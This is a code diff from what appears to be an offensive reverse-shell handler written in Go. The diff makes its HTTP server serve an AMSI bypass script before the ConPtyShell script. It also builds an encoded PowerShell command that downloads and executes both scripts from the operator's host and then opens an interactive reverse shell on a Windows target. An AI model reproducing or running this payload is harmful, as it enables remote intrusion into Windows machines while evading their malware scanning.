@@ -14,7 +14,6 @@ import (
 	"time"
 
 	rice "github.com/GeertJohan/go.rice"
-	"golang.org/x/net/netutil"
 )
 
 // End of prompt Linux
@@ -73,28 +72,40 @@ func (terminal *Terminal) serveHTTPRevShellPowershell() error {
 		terminal.Log.Fatal("Error listening on " + localAddr)
 	}
 	defer terminal.Listener.Close()
+	i := 1
 	var svc = http.Server{
 		Handler: http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
 			templateBox, err := rice.FindBox("../static/")
 			if err != nil {
 				terminal.Log.Fatal(err)
 			}
-			// get file contents as string
-			file, err := templateBox.Open("Invoke-ConPtyShell.ps1")
-			if err != nil {
-				terminal.Log.Fatal(err)
-			}
-			//rice.MustFindBox("./static/Invoke-ConPtyShell.ps1").HTTPBox()
-			http.ServeContent(rw, r, "Invoke-ConPtyShell.ps1", time.Now(), file)
-			terminal.Log.Debug("Invoke-ConPtyShell.ps1 have been served")
-			//http.ServeFile(rw, r, ./static/Invoke-ConPtyShell.ps1)
+			// For the first request we serve the AMSI bypass script, for the second ConptyShell.ps1
+			if i == 1 {
+				file, err := templateBox.Open("amsi-bypass.ps1")
+				if err != nil {
+					terminal.Log.Fatal(err)
+				}
+				http.ServeContent(rw, r, "amsi-bypass.ps1", time.Now(), file)
+				terminal.Log.Debug("amsi-bypass.ps1 have been served")
+				i++
+			} else {
+				// get file contents as string
+				file, err := templateBox.Open("Invoke-ConPtyShell.ps1")
+				if err != nil {
+					terminal.Log.Fatal(err)
+				}
+				//rice.MustFindBox("./static/Invoke-ConPtyShell.ps1").HTTPBox()
+				http.ServeContent(rw, r, "Invoke-ConPtyShell.ps1", time.Now(), file)
+				terminal.Log.Debug("Invoke-ConPtyShell.ps1 have been served")
+				//http.ServeFile(rw, r, ./static/Invoke-ConPtyShell.ps1)
 
-			scriptServed = true
-			terminal.Listener.Close()
+				scriptServed = true
+				terminal.Listener.Close()
+			}
 
 		}),
 	}
-	terminal.Listener = netutil.LimitListener(terminal.Listener, int(1))
+	//terminal.Listener = netutil.LimitListener(terminal.Listener, int(1))
 	err = svc.Serve(terminal.Listener)
 	// If there is an error and the script haven't been served
 	if err != nil && !scriptServed {
@@ -305,7 +316,7 @@ func (terminal *Terminal) interactiveReverseShellLinux() {
 
 func (terminal *Terminal) interactiveReverseShellWindows() {
 	terminal.getTerminalSize()
-	payloadPowershell := `IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
+	payloadPowershell := `Start-Sleep -s 7; IEX(IWR http://` + terminal.Con.LocalAddr().String() + `/amsi -UseBasicParsing);IEX(IWR http://` + terminal.Con.LocalAddr().String() + `/conpty -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
 	payloadPowershell, _ = utils.Utf16leBase64(payloadPowershell)
 	command := "powershell -enc " + payloadPowershell
 	terminal.Log.Debug("Send the command: " + command)
